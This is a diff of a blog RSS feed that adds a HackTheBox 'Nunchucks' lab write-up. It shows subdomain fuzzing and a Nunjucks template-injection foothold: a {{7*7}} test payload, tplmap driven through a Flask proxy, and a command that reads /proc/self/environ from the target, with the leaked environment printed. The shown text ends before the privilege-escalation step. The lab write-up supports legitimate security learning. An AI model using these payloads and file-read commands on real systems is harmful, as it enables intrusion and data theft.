@@ -5,7 +5,505 @@
     <link>https://fahmifj.github.io/</link>
     <description>Recent content on Ef&#39;s log</description>
     <generator>Hugo -- gohugo.io</generator>
-    <lastBuildDate>Fri, 05 Nov 2021 20:40:16 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Sun, 07 Nov 2021 01:42:05 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>HackTheBox - Nunchuks</title>
+      <link>https://fahmifj.github.io/hackthebox/nunchuks/</link>
+      <pubDate>Sun, 07 Nov 2021 01:42:05 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/hackthebox/nunchuks/</guid>
+      <description>SSTI in Nunjucks and SUID capability on Perl</description>
+      <content:encoded><![CDATA[<p>Nunchucks features a NodeJS website that uses <a href="https://mozilla.github.io/nunjucks/">Nunjucks</a> as its templating engine. Fuzzing for the hostname reveals another website that is vulnerable to SSTI, which can be exploited to gain initial access to the system. Further enumeration reveals that the Perl binary has the <code>cap_setuid</code> capability set, and this eventually allows me to escalate myself to root.</p>
+<p>I really enjoyed the foothold part of this box, so that section might be a bit longer.</p>
+<h4 id="skills-learned">Skills Learned</h4>
+<ul>
+<li>Web enumeration</li>
+<li>SSTI on Nunjucks</li>
+<li>Creating tplmap middleware using Flask</li>
+<li>Exploiting <code>cap_setuid</code> on Perl</li>
+</ul>
+<h4 id="tools">Tools</h4>
+<ul>
+<li>Nmap</li>
+<li>Tplmap</li>
+<li>Flask</li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<p>Full TCP scan with <code>nmap</code> reveals 3 open ports: SSH on its default, HTTP and its secure version, HTTPS.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «nunchucks» «10.10.14.46» 
+$ fscan 10.10.11.122 nunchucks
+nmap -p- 10.10.11.122 <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f1 <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/,$//&#39;</span>
+nmap -p 22,80,443 -sC -sV -oA nmap/all-tcp-ports-nunchucks 10.10.11.122
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-11-05 07:12 EDT
+Nmap scan report <span class="k">for</span> 10.10.11.122
+Host is up <span class="o">(</span>0.14s latency<span class="o">)</span>.
+
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+<span class="p">|</span> ssh-hostkey: 
+<span class="p">|</span>   <span class="m">3072</span> 6c:14:6d:bb:74:59:c3:78:2e:48:f5:11:d8:5b:47:21 <span class="o">(</span>RSA<span class="o">)</span>
+<span class="p">|</span>   <span class="m">256</span> a2:f4:2c:42:74:65:a3:7c:26:dd:49:72:23:82:72:71 <span class="o">(</span>ECDSA<span class="o">)</span>
+<span class="p">|</span>_  <span class="m">256</span> e1:8d:44:e7:21:6d:7c:13:2f:ea:3b:83:58:aa:02:b3 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp  open  http     nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+<span class="p">|</span>_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+<span class="p">|</span>_http-title: Did not follow redirect to https://nunchucks.htb/
+443/tcp open  ssl/http nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+<span class="p">|</span>_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+<span class="p">|</span>_http-title: Nunchucks - Landing Page
+<span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>nunchucks.htb/organizationName<span class="o">=</span>Nunchucks-Certificates/stateOrProvinceName<span class="o">=</span>Dorset/countryName<span class="o">=</span>UK
+<span class="p">|</span> Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb
+<span class="p">|</span> Not valid before: 2021-08-30T15:42:24
+<span class="p">|</span>_Not valid after:  2031-08-28T15:42:24
+<span class="p">|</span> tls-alpn: 
+<span class="p">|</span>_  http/1.1
+<span class="p">|</span> tls-nextprotoneg: 
+<span class="p">|</span>_  http/1.1
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 16.77 seconds
+</code></pre></div><p>I&rsquo;ll update my <code>/etc/hosts</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «nunchucks» «10.10.14.46» 
+$ <span class="nb">echo</span> <span class="s1">&#39;10.10.11.122 nunchucks.htb&#39;</span> <span class="p">|</span> sudo tee -a /etc/hosts
+</code></pre></div><h2 id="enumeration">Enumeration</h2>
+<h3 id="http---https">HTTP -&gt; HTTPS</h3>
+<p>For HTTP, nothing interesting in the server response, it has permanent redirection to HTTPS.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «nunchucks» «10.10.14.46» 
+$ curl -I http://nunchucks.htb/ 
+HTTP/1.1 <span class="m">301</span> Moved Permanently
+Server: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+Date: Fri, <span class="m">05</span> Nov <span class="m">2021</span> 11:51:32 GMT
+Content-Type: text/html
+Content-Length: <span class="m">178</span>
+Connection: keep-alive
+Location: https://nunchucks.htb/
+</code></pre></div><h3 id="nunchuckshtb">nunchucks.htb</h3>
+<p>On the HTTPS, it&rsquo;s a company site called Nunchucks that offers online shop creation.</p>
+<p><div class="img-container"><img src="imgs/image-20211105185410047.png" alt="image-20211105185410047"  /></div>
+</p>
+<p>At the bottom of the page, there is an email, also it says it will have a store soon.</p>
+<p><div class="img-container"><img src="imgs/image-20211105190058511.png" alt="image-20211105190058511"  /></div>
+</p>
+<p>Opening Wappalyzer reveals it&rsquo;s using Node.js and PHP. I doubt it&rsquo;s PHP since appending <code>.php</code> gives me a 404 error.</p>
+<p><div class="img-container"><img src="imgs/image-20211105185340514.png" alt="image-20211105185340514"  /></div>
+</p>
+<p>The signup button sends me to <code>/signup</code> where a signup form is shown. I will just signup and intercept the request.</p>
+<p><div class="img-container"><img src="imgs/image-20211105185906028.png" alt="image-20211105185906028"  /></div>
+</p>
+<p>I&rsquo;ll send this request to repeater just in case, and then forward it</p>
+<p><div class="img-container"><img src="imgs/image-20211105185921036.png" alt="image-20211105185921036"  /></div>
+</p>
+<p>But then, the returned response states that registration is closed</p>
+<p><div class="img-container"><img src="imgs/image-20211105190014496.png" alt="image-20211105190014496"  /></div>
+</p>
+<p>I changed the endpoint to <code>/api/login</code>, and it returns the same.</p>
+<p><div class="img-container"><img src="imgs/image-20211105190246106.png" alt="image-20211105190246106"  /></div>
+</p>
+<p>Sending a malformed input breaks the parser and leaks the web directory.</p>
+<p><div class="img-container"><img src="imgs/image-20211105190735552.png" alt="image-20211105190735552"  /></div>
+</p>
+<p>Nothing else to try here.</p>
+<h3 id="subdomain-fuzz">Subdomain Fuzz</h3>
+<p>Fuzzing the Host header reveals a subdomain: <code>store.nunchucks.htb</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «nunchucks» «10.10.14.46» 
+$ ffuf -k -u https://nunchucks.htb -H <span class="s2">&#34;Host: FUZZ.nunchucks.htb&#34;</span> -mc <span class="m">200</span> -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -fl <span class="m">547</span>
+
+        /<span class="s1">&#39;___\  /&#39;</span>___<span class="se">\ </span>          /<span class="err">&#39;</span>___<span class="se">\ </span>      
+       /<span class="se">\ \_</span>_/ /<span class="se">\ \_</span>_/  __  __  /<span class="se">\ \_</span>_/       
+       <span class="se">\ \ </span>,__<span class="se">\\</span> <span class="se">\ </span>,__<span class="se">\/\ \/\ \ \ \ </span>,__<span class="se">\ </span>     
+        <span class="se">\ \ \_</span>/ <span class="se">\ \ \_</span>/<span class="se">\ \ \_\ \ \ \ \_</span>/      
+         <span class="se">\ \_\ </span>  <span class="se">\ \_\ </span> <span class="se">\ \_</span>___/  <span class="se">\ \_\ </span>      
+          <span class="se">\/</span>_/    <span class="se">\/</span>_/   <span class="se">\/</span>___/    <span class="se">\/</span>_/       
+
+       v1.3.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : https://nunchucks.htb
+ :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
+ :: Header           : Host: FUZZ.nunchucks.htb
+ :: Follow redirects : <span class="nb">false</span>
+ :: Calibration      : <span class="nb">false</span>
+ :: Timeout          : <span class="m">10</span>
+ :: Threads          : <span class="m">40</span>
+ :: Matcher          : Response status: <span class="m">200</span>
+ :: Filter           : Response lines: <span class="m">547</span>
+________________________________________________
+
+store                   <span class="o">[</span>Status: 200, Size: 4028, Words: 1053, Lines: 102<span class="o">]</span>
+:: Progress: <span class="o">[</span>4989/4989<span class="o">]</span> :: Job <span class="o">[</span>1/1<span class="o">]</span> :: <span class="m">269</span> req/sec :: Duration: <span class="o">[</span>0:00:22<span class="o">]</span> :: Errors: <span class="m">0</span> ::
+</code></pre></div><p>I&rsquo;ll update my <code>/etc/hosts</code> again.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «nunchucks» «10.10.14.46» 
+$ <span class="nb">echo</span> <span class="s1">&#39;10.10.11.122 store.nunchucks.htb&#39;</span> <span class="p">|</span> sudo tee -a /etc/hosts
+</code></pre></div><h3 id="storenunchuckshtb">store.nunchucks.htb</h3>
+<p>Store is not available, but I can subscribe for newsletter.</p>
+<p><div class="img-container"><img src="imgs/image-20211105191702728.png" alt="image-20211105191702728"  /></div>
+</p>
+<p>When I submit an email address there, it reflects the address back.</p>
+<p><div class="img-container"><img src="imgs/image-20211105191708337.png" alt="image-20211105191708337"  /></div>
+</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="ssti">SSTI</h3>
+<h4 id="identify">Identify</h4>
+<p>Since I&rsquo;ve got a spoiler from the machine tags and the machine name, I immediately sent the typical <code>{{7*7}}</code> SSTI payload, and <code>49</code> returned in the email address. This means the site is vulnerable.</p>
+<p><div class="img-container"><img src="imgs/image-20211105191824204.png" alt="image-20211105191824204"  /></div>
+</p>
+<blockquote>
+<p>The email validation is on client-side.</p>
+</blockquote>
+<h4 id="creating-middleware-for-tplmap-with-flask">Creating Middleware for tplmap with Flask</h4>
+<p>The machine name gives a big spoiler about which templating engine this machine uses (Nunjucks), and there is a nice writeup that shows how to exploit it <a href="http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine.">here</a>. But, I&rsquo;d like to let <code>tplmap</code> identify it for me.</p>
+<p>Unfortunately, there is no such option in <code>tplmap</code> for sending a request in JSON format. Therefore, I created a simple middleware using Flask which acts as a middleman/proxy that will takes the non-JSON request and convert it before forwarding the request to <code>store.nunchucks.js</code>. Here&rsquo;s the code:</p>
+<script type="application/javascript" src="https://gist.github.com/fahmifj/fad39893ee4ec8636baba2903aee7814.js"></script>
+
+<blockquote>
+<p>If you&rsquo;re having trouble with tplmap, maybe this post <a href="https://fahmifj.github.io/blog/tplmap-install/">here</a> could resolve it.</p>
+</blockquote>
+<p>I&rsquo;ll run the middleware.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.46»
+$ python3 middleware.py
+ * Serving Flask app <span class="s2">&#34;middleware&#34;</span> <span class="o">(</span>lazy loading<span class="o">)</span>
+ * Environment: production
+   WARNING: This is a development server. Do not use it in a production deployment.
+   Use a production WSGI server instead.
+ * Debug mode: off
+ * Running on http://0.0.0.0:80/ <span class="o">(</span>Press CTRL+C to quit<span class="o">)</span>
+</code></pre></div><p>Then I will point the tplmap to my middleware.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>tplmap-venv<span class="o">)</span> → kali@kali «tplmap» «10.10.14.46»
+$ ./tplmap.py -u <span class="s1">&#39;http://127.0.0.1/?email=0mochi@iamf.htb&#39;</span>
+</code></pre></div><p>Now I&rsquo;ll just wait for it to finish, and here&rsquo;s the image of how it went.</p>
+<p><div class="img-container"><img src="imgs/image-20211105213721440.png" alt="image-20211105213721440"  /></div>
+</p>
+<p>After a few sec later, <code>tplmap</code> finally got it right.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>tplmap-venv<span class="o">)</span> → kali@kali «tplmap» «10.10.14.46» git:<span class="o">(</span>master<span class="o">)</span> 
+$ ./tplmap.py -u <span class="s1">&#39;http://127.0.0.1/?email=0mochi@iamf.htb&#39;</span>
+<span class="o">[</span>+<span class="o">]</span> Tplmap 0.5
+    Automatic Server-Side Template Injection Detection and Exploitation Tool
+
+<span class="o">[</span>+<span class="o">]</span> Testing <span class="k">if</span> GET parameter <span class="s1">&#39;email&#39;</span> is injectable
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+<span class="o">[</span>+<span class="o">]</span> Nunjucks plugin is testing rendering with tag <span class="s1">&#39;{{*}}&#39;</span>
+<span class="o">[</span>+<span class="o">]</span> Nunjucks plugin has confirmed injection with tag <span class="s1">&#39;{{*}}&#39;</span>
+<span class="o">[</span>+<span class="o">]</span> Tplmap identified the following injection point:
+
+  GET parameter: email
+  Engine: Nunjucks
+  Injection: <span class="o">{{</span>*<span class="o">}}</span>
+  Context: text
+  OS: linux
+  Technique: render
+  Capabilities:
+
+   Shell <span class="nb">command</span> execution: no
+   Bind and reverse shell: no
+   File write: ok
+   File read: ok
+   Code evaluation: ok, javascript code
+
+<span class="o">[</span>+<span class="o">]</span> Rerun tplmap providing one of the following options:
+
+    --upload LOCAL REMOTE       Upload files to the server
+    --download REMOTE LOCAL     Download remote files
+</code></pre></div><p>Based on the <code>tplmap</code> results, it seemed that command execution is not possible.</p>
+<h4 id="grabbing-the-flag">Grabbing The Flag</h4>
+<p>With the file read ability, the first file I want to grab isn&rsquo;t <code>/etc/passwd</code>, but <code>/proc/self/environ</code>, which most likely to reveal some sensitive information.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>tplmap-venv<span class="o">)</span> → kali@kali «tplmap» «10.10.14.46» git:<span class="o">(</span>master<span class="o">)</span> 
+$ ./tplmap.py -u <span class="s1">&#39;http://127.0.0.1/?email=0mochi@iamf.htb&#39;</span> --engine Nunjucks --download <span class="s1">&#39;/proc/self/environ&#39;</span> <span class="s1">&#39;loot/dl_environ&#39;</span>
+<span class="o">[</span>+<span class="o">]</span> Tplmap 0.5
+    Automatic Server-Side Template Injection Detection and Exploitation Tool
+
+<span class="o">[</span>+<span class="o">]</span> Testing <span class="k">if</span> GET parameter <span class="s1">&#39;email&#39;</span> is injectable
+<span class="o">[</span>+<span class="o">]</span> Nunjucks plugin is testing rendering with tag <span class="s1">&#39;{{*}}&#39;</span>
+<span class="o">[</span>+<span class="o">]</span> Nunjucks plugin has confirmed injection with tag <span class="s1">&#39;{{*}}&#39;</span>
+<span class="o">[</span>+<span class="o">]</span> Tplmap identified the following injection point:
+
+  GET parameter: email
+  Engine: Nunjucks
+  Injection: <span class="o">{{</span>*<span class="o">}}</span>
+  Context: text
+  OS: linux
+  Technique: render
+  Capabilities:
+
+   Shell <span class="nb">command</span> execution: no
+   Bind and reverse shell: no
+   File write: ok
+   File read: ok
+   Code evaluation: ok, javascript code
+
+<span class="o">[</span>*<span class="o">][</span>plugin<span class="o">]</span> Remote file md5 mismatch, check manually
+</code></pre></div><p>Even though the tool showed md5 mismatch, I can still read the file contents. This file reveals that the app is running as user <code>david</code> under <code>/var/www/store.nunchucks</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «tplmap» «10.10.14.46» git:<span class="o">(</span>master<span class="o">)</span> ✗ 
+$ cat loot/dl_environ <span class="p">|</span> tr <span class="s1">&#39;,&#39;</span> <span class="s1">&#39;\n&#39;</span>
+<span class="nv">LANG</span><span class="o">=</span>en_GB.UTF-8PATH<span class="o">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/usr/bin:/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/binPIDFILE<span class="o">=</span>/home/david/.pm2/pm2.pidHOME<span class="o">=</span>/home/davidLOGNAME<span class="o">=</span><span class="nv">davidUSER</span><span class="o">=</span><span class="nv">davidSHELL</span><span class="o">=</span>/bin/bashINVOCATION_ID<span class="o">=</span><span class="nv">c56bdde5ecfc4ab2800ce66c625918d4JOURNAL_STREAM</span><span class="o">=</span>9:34693PM2_USAGE<span class="o">=</span><span class="nv">CLIPM2_HOME</span><span class="o">=</span>/home/david/.pm2SILENT<span class="o">=</span><span class="nv">truewindowsHide</span><span class="o">=</span><span class="nv">truepm2_env</span><span class="o">={</span><span class="s2">&#34;kill_retry_time&#34;</span>:100
+<span class="s2">&#34;windowsHide&#34;</span>:true
+<span class="s2">&#34;username&#34;</span>:<span class="s2">&#34;david&#34;</span>
+<span class="s2">&#34;treekill&#34;</span>:true
+<span class="s2">&#34;automation&#34;</span>:true
+<span class="s2">&#34;pmx&#34;</span>:true
+<span class="s2">&#34;instance_var&#34;</span>:<span class="s2">&#34;NODE_APP_INSTANCE&#34;</span>
+<span class="s2">&#34;watch&#34;</span>:false
+<span class="s2">&#34;autorestart&#34;</span>:true
+<span class="s2">&#34;vizion&#34;</span>:true
+<span class="s2">&#34;env&#34;</span>:<span class="o">{</span><span class="s2">&#34;PM2_USAGE&#34;</span>:<span class="s2">&#34;CLI&#34;</span>
+<span class="s2">&#34;OLDPWD&#34;</span>:<span class="s2">&#34;/var/www&#34;</span>
+<span class="s2">&#34;_&#34;</span>:<span class="s2">&#34;/usr/local/bin/pm2&#34;</span>
+<span class="s2">&#34;MAIL&#34;</span>:<span class="s2">&#34;/var/mail/david&#34;</span>
+<span class="s2">&#34;DBUS_SESSION_BUS_ADDRESS&#34;</span>:<span class="s2">&#34;unix:path=/run/user/1000/bus&#34;</span>
+<span class="s2">&#34;PATH&#34;</span>:<span class="s2">&#34;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin&#34;</span>
+<span class="s2">&#34;HUSHLOGIN&#34;</span>:<span class="s2">&#34;FALSE&#34;</span>
+<span class="s2">&#34;JOURNAL_STREAM&#34;</span>:<span class="s2">&#34;9:35778&#34;</span>
+<span class="s2">&#34;XDG_RUNTIME_DIR&#34;</span>:<span class="s2">&#34;/run/user/1000&#34;</span>
+<span class="s2">&#34;XDG_SESSION_ID&#34;</span>:<span class="s2">&#34;1&#34;</span>
+<span class="s2">&#34;XDG_VTNR&#34;</span>:<span class="s2">&#34;1&#34;</span>
+<span class="s2">&#34;SHLVL&#34;</span>:<span class="s2">&#34;1&#34;</span>
+<span class="s2">&#34;USER&#34;</span>:<span class="s2">&#34;david&#34;</span>
+<span class="s2">&#34;LESSOPEN&#34;</span>:<span class="s2">&#34;| /usr/bin/lesspipe %s&#34;</span>
+<span class="s2">&#34;TERM&#34;</span>:<span class="s2">&#34;linux&#34;</span>
+<span class="s2">&#34;XDG_SESSION_CLASS&#34;</span>:<span class="s2">&#34;user&#34;</span>
+<span class="s2">&#34;LESSCLOSE&#34;</span>:<span class="s2">&#34;/usr/bin/lesspipe %s %s&#34;</span>
+<span class="s2">&#34;INVOCATION_ID&#34;</span>:<span class="s2">&#34;d8a8bc4baeb140c685790fc6e1974718&#34;</span>
+<span class="s2">&#34;LS_COLORS&#34;</span>:<span class="s2">&#34;rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:&#34;</span>
+<span class="s2">&#34;LANG&#34;</span>:<span class="s2">&#34;en_GB.UTF-8&#34;</span>
+<span class="s2">&#34;HOME&#34;</span>:<span class="s2">&#34;/home/david&#34;</span>
+<span class="s2">&#34;MOTD_SHOWN&#34;</span>:<span class="s2">&#34;pam&#34;</span>
+<span class="s2">&#34;XDG_SESSION_TYPE&#34;</span>:<span class="s2">&#34;tty&#34;</span>
+<span class="s2">&#34;LOGNAME&#34;</span>:<span class="s2">&#34;david&#34;</span>
+<span class="s2">&#34;PWD&#34;</span>:<span class="s2">&#34;/var/www/store.nunchucks&#34;</span>
+<span class="s2">&#34;XDG_SEAT&#34;</span>:<span class="s2">&#34;seat0&#34;</span>
+<span class="s2">&#34;SHELL&#34;</span>:<span class="s2">&#34;/bin/bash&#34;</span>
+<span class="s2">&#34;PM2_HOME&#34;</span>:<span class="s2">&#34;/home/david/.pm2&#34;</span>
+<span class="s2">&#34;server&#34;</span>:<span class="o">{}</span>
+<span class="s2">&#34;unique_id&#34;</span>:<span class="s2">&#34;cc712ea0-c7b6-40af-9a85-94d9a4fee31a&#34;</span><span class="o">}</span>
+<span class="s2">&#34;namespace&#34;</span>:<span class="s2">&#34;default&#34;</span>
+<span class="s2">&#34;filter_env&#34;</span>:<span class="o">[]</span>
+<span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;server&#34;</span>
+<span class="s2">&#34;node_args&#34;</span>:<span class="o">[]</span>
+<span class="s2">&#34;pm_exec_path&#34;</span>:<span class="s2">&#34;/var/www/store.nunchucks/server.js&#34;</span>
+<span class="s2">&#34;pm_cwd&#34;</span>:<span class="s2">&#34;/var/www/store.nunchucks&#34;</span>
+<span class="s2">&#34;exec_interpreter&#34;</span>:<span class="s2">&#34;node&#34;</span>
+<span class="s2">&#34;exec_mode&#34;</span>:<span class="s2">&#34;cluster_mode&#34;</span>
+<span class="s2">&#34;pm_out_log_path&#34;</span>:<span class="s2">&#34;/home/david/.pm2/logs/server-out-6.log&#34;</span>
+<span class="s2">&#34;pm_err_log_path&#34;</span>:<span class="s2">&#34;/home/david/.pm2/logs/server-error-6.log&#34;</span>
+<span class="s2">&#34;pm_pid_path&#34;</span>:<span class="s2">&#34;/home/david/.pm2/pids/server-6.pid&#34;</span>
+<span class="s2">&#34;km_link&#34;</span>:false
+<span class="s2">&#34;vizion_running&#34;</span>:false
+<span class="s2">&#34;NODE_APP_INSTANCE&#34;</span>:5
+<span class="s2">&#34;PM2_USAGE&#34;</span>:<span class="s2">&#34;CLI&#34;</span>
+<span class="s2">&#34;OLDPWD&#34;</span>:<span class="s2">&#34;/var/www&#34;</span>
+<span class="s2">&#34;_&#34;</span>:<span class="s2">&#34;/usr/local/bin/pm2&#34;</span>
+<span class="s2">&#34;MAIL&#34;</span>:<span class="s2">&#34;/var/mail/david&#34;</span>
+<span class="s2">&#34;DBUS_SESSION_BUS_ADDRESS&#34;</span>:<span class="s2">&#34;unix:path=/run/user/1000/bus&#34;</span>
+<span class="s2">&#34;PATH&#34;</span>:<span class="s2">&#34;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin&#34;</span>
+<span class="s2">&#34;HUSHLOGIN&#34;</span>:<span class="s2">&#34;FALSE&#34;</span>
+<span class="s2">&#34;JOURNAL_STREAM&#34;</span>:<span class="s2">&#34;9:35778&#34;</span>
+<span class="s2">&#34;XDG_RUNTIME_DIR&#34;</span>:<span class="s2">&#34;/run/user/1000&#34;</span>
+<span class="s2">&#34;XDG_SESSION_ID&#34;</span>:<span class="s2">&#34;1&#34;</span>
+<span class="s2">&#34;XDG_VTNR&#34;</span>:<span class="s2">&#34;1&#34;</span>
+<span class="s2">&#34;SHLVL&#34;</span>:<span class="s2">&#34;1&#34;</span>
+<span class="s2">&#34;USER&#34;</span>:<span class="s2">&#34;david&#34;</span>
+<span class="s2">&#34;LESSOPEN&#34;</span>:<span class="s2">&#34;| /usr/bin/lesspipe %s&#34;</span>
+<span class="s2">&#34;TERM&#34;</span>:<span class="s2">&#34;linux&#34;</span>
+<span class="s2">&#34;XDG_SESSION_CLASS&#34;</span>:<span class="s2">&#34;user&#34;</span>
+<span class="s2">&#34;LESSCLOSE&#34;</span>:<span class="s2">&#34;/usr/bin/lesspipe %s %s&#34;</span>
+<span class="s2">&#34;INVOCATION_ID&#34;</span>:<span class="s2">&#34;d8a8bc4baeb140c685790fc6e1974718&#34;</span>
+<span class="s2">&#34;LS_COLORS&#34;</span>:<span class="s2">&#34;rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:&#34;</span>
+<span class="s2">&#34;LANG&#34;</span>:<span class="s2">&#34;en_GB.UTF-8&#34;</span>
